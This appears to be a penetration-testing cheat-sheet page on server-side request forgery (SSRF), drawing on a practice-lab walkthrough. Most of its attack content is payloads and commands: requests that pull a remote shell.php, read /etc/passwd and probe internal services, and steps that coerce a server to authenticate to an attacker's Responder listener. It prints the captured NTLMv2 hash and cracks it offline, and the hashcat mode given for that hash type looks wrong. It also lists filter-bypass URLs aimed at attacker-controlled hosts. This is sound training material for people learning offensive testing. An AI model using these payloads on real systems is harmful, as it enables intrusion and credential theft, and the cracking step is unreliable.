Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location. The attacker could create a request to internet or to the intranet, which can be used to port scan or probe a remote machine. Basically, it could allow an atacker to:

- Take control of a remote machine.
- Read or update data.
- Read the server configuration.
- Connect to internal services...


With:

```
http://
file:///
dict://
```


## Exploitation


### Load the Contents of a File

```
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

[See Burpsuite Labs](../burpsuite/burpsuite-ssrf.md)

### Read files from restricted resources 

```
GET https://example.com/page?page=https://localhost:8080/admin
GET https://example.com/page?page=https://127.0.0.1:8080/admin
GET https://example.com/page?page=file:///etc/passwd
```


### Read files from other backend systems

In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses.


```
GET https://example.com/page?page=https://localhost:3306/
GET https://example.com/page?page=https://localhost:6379/
GET https://example.com/page?page=https://localhost:8080/
```

Gopherus sends non authenticated requests to other services and it succeded.

### Trigger an authentication and capture NTMLv2 

Complete walkthrough at  [OSCP Heist - A Playground Practice machine](../oscp-heist.md)

Navigate  to http://192.168.110.165:8080/ .

Set a listener in the attacker machine:

```bash
php -S 0.0.0.0:9898
```

Launch the browser:

![[heist_00.png]]

There is a request in the listener:

![[heist_01.png]]

There is a Server Side Request Forgery vulnerability. However there is no execution on the server. By serving a bind or reverse shell the tester can obtain execution on their own attacker machine, never on the server one.

However, it's possible to make the target server to authenticate to the attacker machine exploiting this SSRF:

Set  a responder server in the attacker machine: 

```bash
sudo responder -I tun0 -w -d
```

Trigger the SSRF vulnerability by navigating to http://192.168.207.165:8080/?url=http%3A%2F%2F192.168.45.154:80

```bash
Trigger the SSRF vulnerability by navigating to http://192.168.207.165:8080/?url=http%3A%2F%2F192.168.45.154:8081 
```

where 192.168.207.165 is the target machine and 192.168.45.154 the kali attacker machine. 

Responder output:

```
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:e62ea0c508de08d9:4DDBB74479475CDDC0ED0B18317FD3B6:0101000000000000BFE67266C824DC01707BB49690CC9B1A000000000200080046004B004900450001001E00570049004E002D0047003500590054004E003100460052003500300051000400140046004B00490045002E004C004F00430041004C0003003400570049004E002D0047003500590054004E003100460052003500300051002E0046004B00490045002E004C004F00430041004C000500140046004B00490045002E004C004F00430041004C000800300030000000000000000000000000300000C4F51C6E9DB9499D59C386C317DB4FE1D9EF380289201E62A8474177A8845FCE0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100350034000000000000000000
```

The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

```bash
# Save hash in a file
echo "enox::HEIST:e62ea0c508de08d9:4DDBB74479475CDDC0ED0B18317FD3B6:0101000000000000BFE67266C824DC01707BB49690CC9B1A000000000200080046004B004900450001001E00570049004E002D0047003500590054004E003100460052003500300051000400140046004B00490045002E004C004F00430041004C0003003400570049004E002D0047003500590054004E003100460052003500300051002E0046004B00490045002E004C004F00430041004C000500140046004B00490045002E004C004F00430041004C000800300030000000000000000000000000300000C4F51C6E9DB9499D59C386C317DB4FE1D9EF380289201E62A8474177A8845FCE0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100350034000000000000000000" > hash.txt
```

Crack it offline:

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```




## Techniques

**Bypass blacklist-based input filters**

Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using the following techniques:

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

**Bypass whitelist-based input filters**

Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.

- Using the `@` character to separate between the userinfo and the host: `https://expected-host:fakepassword@evil-host
- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: - `https://expected-host.evil-host`
- URL encoding. Double URL-encode characters to confuse the URL-parsing code.
- Fuzzing
- Combinations of all of the above

### Exploiting redirection vulnerabilities

It is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.
